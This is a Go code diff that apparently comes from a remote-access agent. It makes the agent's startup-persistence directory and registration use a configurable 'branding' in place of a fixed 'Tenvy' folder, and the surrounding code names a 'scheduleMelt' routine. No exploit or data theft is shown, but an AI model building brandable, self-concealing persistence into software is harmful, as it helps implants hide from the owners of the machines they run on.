@@ -34,7 +34,7 @@ func (a *Agent) applyPreferences() {
 				target = exe
 			}
 		}
-		if err := configureStartupPreference(target); err != nil {
+		if err := configureStartupPreference(a.preferences, target); err != nil {
 			a.logger.Printf("startup preference not fully applied: %v", err)
 		} else {
 			a.logger.Printf("recorded startup preference for %s", target)
@@ -108,7 +108,7 @@ func (a *Agent) scheduleMelt(path string) {
 	}()
 }
 
-func configureStartupPreference(target string) error {
+func configureStartupPreference(pref BuildPreferences, target string) error {
 	target = strings.TrimSpace(target)
 	if target == "" {
 		return errors.New("no target provided for startup preference")
@@ -119,17 +119,8 @@ func configureStartupPreference(target string) error {
 		target = absTarget
 	}
 
-	homeDir, err := os.UserHomeDir()
-	if err != nil {
-		return fmt.Errorf("resolve home directory: %w", err)
-	}
-
-	var configDir string
-	if runtime.GOOS == "windows" {
-		configDir = filepath.Join(homeDir, "AppData", "Roaming", "Tenvy")
-	} else {
-		configDir = filepath.Join(homeDir, ".config", "tenvy")
-	}
+	branding := pref.persistenceBranding()
+	configDir := branding.baseDirectory()
 
 	if err := os.MkdirAll(configDir, 0o755); err != nil {
 		return fmt.Errorf("create startup config directory: %w", err)
@@ -140,7 +131,7 @@ func configureStartupPreference(target string) error {
 		return fmt.Errorf("persist startup preference: %w", err)
 	}
 
-	if err := registerStartup(target); err != nil {
+	if err := registerStartup(target, branding); err != nil {
 		return fmt.Errorf("register startup entry: %w", err)
 	}
 
